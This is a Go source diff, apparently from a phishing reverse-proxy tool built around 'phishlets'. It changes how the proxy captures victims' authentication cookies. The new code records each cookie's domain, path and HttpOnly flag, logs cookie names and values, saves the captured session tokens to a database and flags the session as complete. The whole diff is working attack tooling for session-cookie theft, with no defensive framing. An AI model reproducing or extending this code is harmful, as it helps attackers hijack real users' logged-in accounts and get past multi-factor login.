@@ -106,7 +106,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				req_url += "?" + req.URL.RawQuery
 			}
 
-			log.Debug("http: %s", req_url)
+			//log.Debug("http: %s", req_url)
 
 			parts := strings.SplitN(req.RemoteAddr, ":", 2)
 			remote_addr := parts[0]
@@ -323,9 +323,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			// fix cookies
 			pl := p.getPhishletByOrigHost(resp.Request.Host)
-			var auth_tokens []string
+			var auth_tokens map[string][]*AuthToken
 			if pl != nil {
-				auth_tokens = pl.getAuthTokens()
+				auth_tokens = pl.authTokens
 			}
 			is_auth := false
 			cookies := resp.Cookies()
@@ -333,14 +333,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			for _, ck := range cookies {
 				// parse cookie
 				if pl != nil && ps.SessionId != "" {
-					if stringExists(ck.Name, auth_tokens) {
+					c_domain := ck.Domain
+					if c_domain == "" {
+						c_domain = resp.Request.Host
+					}
+					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
+					if pl.isAuthToken(c_domain, ck.Name) {
 						s, ok := p.sessions[ps.SessionId]
 						if ok && !s.IsDone {
 							if ck.Value != "" { // cookies with empty values are of no interest to us
-								is_auth = s.AddAuthToken(ck.Name, ck.Value, auth_tokens)
+								is_auth = s.AddAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, auth_tokens)
 								if is_auth {
-									tmap := pl.GenerateTokenSet(s.Tokens)
-									if err := p.db.SetSessionTokens(ps.SessionId, tmap); err != nil {
+									if err := p.db.SetSessionTokens(ps.SessionId, s.Tokens); err != nil {
 										log.Error("database: %v", err)
 									}
 									s.IsDone = true
